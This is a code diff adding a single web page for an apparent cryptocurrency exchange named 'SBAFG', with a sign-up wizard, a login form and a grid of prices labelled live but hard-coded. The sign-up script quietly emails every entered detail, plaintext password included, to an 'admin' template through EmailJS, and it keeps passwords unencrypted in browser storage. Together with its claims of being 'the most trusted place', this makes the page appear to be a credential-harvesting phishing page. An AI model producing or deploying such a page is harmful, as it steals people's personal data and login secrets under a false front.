@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SBAFG is the most trusted place to buy, sell, and use cryptocurrency. Track live prices and jump start your portfolio today.">
+    <meta name="keywords" content="crypto, cryptocurrency, bitcoin, ethereum, real-time price, portfolio, buy crypto, sell crypto, SBAFG">
+    <meta name="author" content="SBAFG">
+    <title>SBAFG - Live Crypto Prices</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        /* --- General Body and Font Styles --- */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 24px;
+            color: #121212;
+            background-color: #f7f9fc;
+        }
+
+        /* --- Header Styles --- */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 48px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px; /* Space between logo shape and text */
+        }
+        
+        .logo-design {
+            width: 28px;
+            height: 28px;
+            background-color: #0052FF;
+            border-radius: 6px;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0052FF;
+        }
+
+        .header-buttons {
+            display: flex;
+            align-items: center;
+            gap: 16px; /* Space between buttons */
+        }
+
+        .log-in-btn-header {
+            background: transparent;
+            border: none;
+            color: #0052FF;
+            font-weight: bold;
+            font-size: 16px;
+            padding: 10px;
+            cursor: pointer;
+        }
+
+        .sign-up-btn-header {
+            background-color: #0052FF;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .hamburger-menu {
+            width: 24px;
+            height: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .hamburger-menu span {
+            display: block;
+            width: 100%;
+            height: 3px;
+            background-color: #121212;
+        }
+        
+        /* --- Main Content (Sign-up form) Styles --- */
+        .main-content {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .main-content a {
+            text-decoration: none;
+            color: #121212;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .main-content h1 {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-top: 24px;
+            margin-bottom: 16px;
+        }
+
+        .main-content p {
+            font-size: 20px;
+            color: #5d6a7e;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .email-label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+
+        .sign-up-btn-main {
+            background-color: #0052FF;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* --- NEW: Crypto Price Grid Styles --- */
+        .crypto-section {
+            max-width: 540px;
+            margin: 60px auto 0;
+        }
+
+        .crypto-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+
+        .crypto-card {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            transition: transform 0.2s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .crypto-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .crypto-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .crypto-logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 12px;
+        }
+
+        .crypto-name {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .crypto-price {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .crypto-change {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .positive { color: #059669; }
+        .negative { color: #DC2626; }
+        .neutral { color: #6B7280; }
+        
+        /* --- Modal Styles (for both Sign-up and Log-in) --- */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.5); /* Dim background */
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+
+        .modal-close-btn {
+            color: #aaa;
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .modal-content h2 {
+            margin-top: 0;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .modal-form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .modal-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 4px;
+            border: 1px solid #dcdcdc;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        /* --- Multi-Step Sign-up Styles --- */
+        .signup-step {
+            display: none;
+        }
+        .signup-step.active-step {
+            display: block;
+        }
+        
+        .modal-progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            gap: 5px;
+        }
+        .progress-step {
+            flex-grow: 1;
+            height: 6px;
+            background-color: #e0e0e0;
+            border-radius: 3px;
+            transition: background-color 0.3s ease;
+        }
+        .progress-step.completed {
+             background-color: #0052FF;
+        }
+
+        /* --- Navigation Button Styles --- */
+        .modal-form-navigation {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .nav-btn {
+            background-color: #0052FF;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .nav-btn.prev-btn {
+            background-color: transparent;
+            color: #5d6a7e;
+            border: 1px solid #dcdcdc;
+            margin-right: auto;
+        }
+        #create-account-btn {
+            width: 100%;
+        }
+        
+        /* --- NEW: Success Prompt Style --- */
+        .success-prompt {
+            display: none; /* Hidden by default */
+            padding: 12px 15px;
+            background-color: #28a745; /* Success Green */
+            color: white;
+            text-align: center;
+            border-radius: 5px;
+            margin-bottom: 20px; /* Space below the prompt */
+            font-size: 15px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-design"></div>
+            <div class="logo-text">SBAFG</div>
+        </div>
+        <div class="header-buttons">
+            <button class="log-in-btn-header" id="header-login-btn">Log in</button>
+            <button class="sign-up-btn-header" id="header-signup-btn">Sign up</button>
+        </div>
+        <div class="hamburger-menu">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <p>
+            <a id="jump-start-link"><strong>₿ Jump start your portfolio &rarr;</strong></a>
+        </p>
+        <h1>The future of money is here</h1>
+        <p>We're the most trusted place for people and businesses to buy, sell, and use crypto.</p>
+        <form>
+            <label for="email" class="email-label">Email address</label>
+            <input type="email" id="email" class="email-input" placeholder="satoshi@nakamoto.com">
+            <button type="submit" class="sign-up-btn-main" id="main-signup-btn">Get started</button>
+        </form>
+    </main>
+
+    <section class="crypto-section" id="crypto-prices">
+        <div class="crypto-grid">
+            </div>
+    </section>
+
+    <div id="signup-modal" class="modal">
+        <div class="modal-content">
+            <span id="signup-close-btn" class="modal-close-btn">&times;</span>
+            <h2>Create your account</h2>
+            <div class="modal-progress-bar">
+                <div class="progress-step" data-step="1"></div>
+                <div class="progress-step" data-step="2"></div>
+                <div class="progress-step" data-step="3"></div>
+            </div>
+            <form id="signup-form" class="modal-form">
+                <div class="signup-step" data-step="1">
+                    <label for="modal-fullname">Full Name</label>
+                    <input type="text" id="modal-fullname" required>
+                    <label for="modal-email">Email</label>
+                    <input type="email" id="modal-email" required>
+                    <label for="modal-phone">Phone Number</label>
+                    <input type="tel" id="modal-phone" required>
+                </div>
+                <div class="signup-step" data-step="2">
+                    <label for="modal-address">Address</label>
+                    <input type="text" id="modal-address" required>
+                    <label for="modal-city">City</label>
+                    <input type="text" id="modal-city" required>
+                    <label for="modal-state">State</label>
+                    <input type="text" id="modal-state" required>
+                </div>
+                <div class="signup-step" data-step="3">
+                    <label for="modal-zip">Zip Code</label>
+                    <input type="text" id="modal-zip" required>
+                    <label for="modal-username">Desired Username</label>
+                    <input type="text" id="modal-username" required>
+                    <label for="modal-password">Desired Password</label>
+                    <input type="password" id="modal-password" required>
+                </div>
+                <div class="modal-form-navigation">
+                    <button type="button" id="prev-btn" class="nav-btn prev-btn">Previous</button>
+                    <button type="button" id="next-btn" class="nav-btn">Next</button>
+                    <button type="submit" id="create-account-btn" class="nav-btn">Create Account</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <div id="login-modal" class="modal">
+        <div class="modal-content">
+            <div id="login-success-prompt" class="success-prompt">Account created! Please log in.</div>
+            <span id="login-close-btn" class="modal-close-btn">&times;</span>
+            <h2>Welcome Back!</h2>
+            <form id="login-form" class="modal-form">
+                <label for="login-username">Username</label>
+                <input type="text" id="login-username" required>
+                <label for="login-password">Password</label>
+                <input type="password" id="login-password" required>
+                <button type="submit" class="sign-up-btn-main">Log in</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            /* --- Real-Time Crypto Price Logic --- */
+            const cryptoData = [
+                { name: 'Bitcoin', symbol: 'BTC', price: 117470.02, change: 0.01, logo: 'https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg' },
+                { name: 'Ethereum', symbol: 'ETH', price: 2940.13, change: 1.64, logo: 'https://upload.wikimedia.org/wikipedia/commons/0/05/Ethereum_logo_2014.svg' },
+                { name: 'BNB', symbol: 'BNB', price: 686.03, change: 1.27, logo: 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Binance-coin-bnb-logo.svg' },
+                { name: 'Solana', symbol: 'SOL', price: 160.18, change: 2.10, logo: 'https://upload.wikimedia.org/wikipedia/en/b/b9/Solana_logo.png' },
+                { name: 'XRP', symbol: 'XRP', price: 2.72, change: -1.70, logo: 'https://upload.wikimedia.org/wikipedia/commons/0/08/Xrp-icon-freotated.svg' },
+                { name: 'Dogecoin', symbol: 'DOGE', price: 0.1969, change: 5.78, logo: 'https://upload.wikimedia.org/wikipedia/en/d/d0/Dogecoin_Logo.png' }
+            ];
+
+            function displayCryptoPrices() {
+                const cryptoGrid = document.querySelector('.crypto-grid');
+                if (!cryptoGrid) return;
+                cryptoGrid.innerHTML = ''; // Clear existing cards
+
+                cryptoData.forEach(crypto => {
+                    const changeClass = crypto.change > 0 ? 'positive' : crypto.change < 0 ? 'negative' : 'neutral';
+                    const sign = crypto.change > 0 ? '+' : '';
+
+                    const card = `
+                        <div class="crypto-card">
+                            <div class="crypto-title">
+                                <img src="${crypto.logo}" alt="${crypto.name} logo" class="crypto-logo">
+                                <span class="crypto-name">${crypto.name} (${crypto.symbol})</span>
+                            </div>
+                            <div class="crypto-price">$${crypto.price.toLocaleString()}</div>
+                            <div class="crypto-change ${changeClass}">
+                                ${sign}${crypto.change.toFixed(2)}%
+                            </div>
+                        </div>
+                    `;
+                    cryptoGrid.innerHTML += card;
+                });
+            }
+            
+            displayCryptoPrices();
+            
+            /* --- Modal & Multi-Step Form Logic --- */
+            const signupModal = document.getElementById('signup-modal');
+            const loginModal = document.getElementById('login-modal');
+            const headerSignupBtn = document.getElementById('header-signup-btn');
+            const mainSignupBtn = document.getElementById('main-signup-btn');
+            const signupCloseBtn = document.getElementById('signup-close-btn');
+            const jumpStartLink = document.getElementById('jump-start-link');
+            const headerLoginBtn = document.getElementById('header-login-btn');
+            const loginCloseBtn = document.getElementById('login-close-btn');
+            const loginSuccessPrompt = document.getElementById('login-success-prompt');
+
+            const openSignupModal = () => {
+                resetSignupForm();
+                signupModal.style.display = 'flex';
+            };
+            const closeSignupModal = () => { signupModal.style.display = 'none'; };
+
+            const openLoginModal = (showSuccess = false) => {
+                if (showSuccess) {
+                    loginSuccessPrompt.style.display = 'block';
+                    setTimeout(() => {
+                        loginSuccessPrompt.style.display = 'none';
+                    }, 5000);
+                } else {
+                    loginSuccessPrompt.style.display = 'none';
+                }
+                loginModal.style.display = 'flex';
+            };
+            
+            const closeLoginModal = () => { loginModal.style.display = 'none'; };
+
+            headerSignupBtn.addEventListener('click', openSignupModal);
+            mainSignupBtn.addEventListener('click', (event) => {
+                event.preventDefault();
+                openSignupModal();
+            });
+            jumpStartLink.addEventListener('click', (event) => {
+                event.preventDefault();
+                const cryptoSection = document.getElementById('crypto-prices');
+                cryptoSection.scrollIntoView({ behavior: 'smooth' });
+            });
+            signupCloseBtn.addEventListener('click', closeSignupModal);
+            headerLoginBtn.addEventListener('click', () => openLoginModal(false));
+            loginCloseBtn.addEventListener('click', closeLoginModal);
+            
+            window.addEventListener('click', (event) => {
+                if (event.target == signupModal) closeSignupModal();
+                if (event.target == loginModal) closeLoginModal();
+            });
+
+            // --- Multi-Step Sign-up Form Logic ---
+            let currentStep = 1;
+            const totalSteps = 3;
+            const nextBtn = document.getElementById('next-btn');
+            const prevBtn = document.getElementById('prev-btn');
+            const createAccountBtn = document.getElementById('create-account-btn');
+            const steps = document.querySelectorAll('.signup-step');
+            const progressSteps = document.querySelectorAll('.progress-step');
+
+            function updateFormStep() {
+                steps.forEach(step => {
+                    step.classList.remove('active-step');
+                    if (parseInt(step.dataset.step) === currentStep) {
+                        step.classList.add('active-step');
+                    }
+                });
+                progressSteps.forEach((step, index) => {
+                    if (index < currentStep) {
+                        step.classList.add('completed');
+                    } else {
+                        step.classList.remove('completed');
+                    }
+                });
+                prevBtn.style.display = currentStep > 1 ? 'block' : 'none';
+                nextBtn.style.display = currentStep < totalSteps ? 'block' : 'none';
+                createAccountBtn.style.display = currentStep === totalSteps ? 'block' : 'none';
+            }
+
+            function validateStep() {
+                const activeStep = document.querySelector(`.signup-step[data-step="${currentStep}"]`);
+                const inputs = activeStep.querySelectorAll('input[required]');
+                for (let input of inputs) {
+                    if (!input.value.trim()) {
+                        alert(`Please fill out the ${input.previousElementSibling.innerText} field.`);
+                        input.focus();
+                        return false;
+                    }
+                }
+                return true;
+            }
+
+            function resetSignupForm() {
+                document.getElementById('signup-form').reset();
+                currentStep = 1;
+                updateFormStep();
+            }
+
+            nextBtn.addEventListener('click', () => {
+                if (validateStep()) {
+                    currentStep++;
+                    updateFormStep();
+                }
+            });
+
+            prevBtn.addEventListener('click', () => {
+                currentStep--;
+                updateFormStep();
+            });
+            
+            updateFormStep();
+
+            // --- Sign-up Form Submission ---
+            const signupForm = document.getElementById('signup-form');
+            signupForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                if (!validateStep()) return;
+
+                const userParams = {
+                    fullname: document.getElementById('modal-fullname').value,
+                    email: document.getElementById('modal-email').value,
+                    phone: document.getElementById('modal-phone').value,
+                    address: document.getElementById('modal-address').value,
+                    city: document.getElementById('modal-city').value,
+                    state: document.getElementById('modal-state').value,
+                    zip: document.getElementById('modal-zip').value,
+                    username: document.getElementById('modal-username').value,
+                    password: document.getElementById('modal-password').value
+                };
+
+                const existingUsers = JSON.parse(localStorage.getItem('sba-fg-users')) || [];
+                if (existingUsers.some(user => user.email === userParams.email)) {
+                    alert('This email address has already been used. Please try another one.');
+                    currentStep = 1;
+                    updateFormStep();
+                    return;
+                }
+                if (existingUsers.some(user => user.username === userParams.username)) {
+                    alert('This username is already taken. Please choose another one.');
+                    currentStep = 3;
+                    updateFormStep();
+                    return;
+                }
+                
+                // Save user to local storage (for persistence)
+                existingUsers.push(userParams);
+                localStorage.setItem('sba-fg-users', JSON.stringify(existingUsers));
+
+                // Send emails via EmailJS (optional)
+                const serviceID = 'service_g7zz46x';
+                const adminTemplateID = 'template_82ekv1s';
+                const welcomeTemplateID = 'template_w839mal';
+                const publicKey = 'RJ2kjdHm0pFHk9M5v';
+                
+                createAccountBtn.disabled = true;
+                createAccountBtn.innerText = 'Creating...';
+
+                emailjs.send(serviceID, adminTemplateID, userParams, publicKey)
+                    .then(() => emailjs.send(serviceID, welcomeTemplateID, { to_name: userParams.fullname, to_email: userParams.email }, publicKey))
+                    .catch(err => console.log("EmailJS error:", err))
+                    .finally(() => {
+                        closeSignupModal();
+                        openLoginModal(true); // Show success prompt on login modal
+                        createAccountBtn.disabled = false;
+                        createAccountBtn.innerText = 'Create Account';
+                    });
+            });
+            
+            // --- MODIFIED: Login Form Handling ---
+            const loginForm = document.getElementById('login-form');
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                const enteredUsername = document.getElementById('login-username').value;
+                const enteredPassword = document.getElementById('login-password').value;
+
+                // Check for dynamically created users from local storage
+                const existingUsers = JSON.parse(localStorage.getItem('sba-fg-users')) || [];
+                const foundUser = existingUsers.find(user => user.username === enteredUsername && user.password === enteredPassword);
+                
+                if (foundUser) {
+                    // MODIFICATION: Save logged-in user to sessionStorage and redirect
+                    sessionStorage.setItem('loggedInUser', JSON.stringify(foundUser));
+                    window.location.href = 'dashboard.html';
+                } else {
+                    alert('Invalid username or password.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
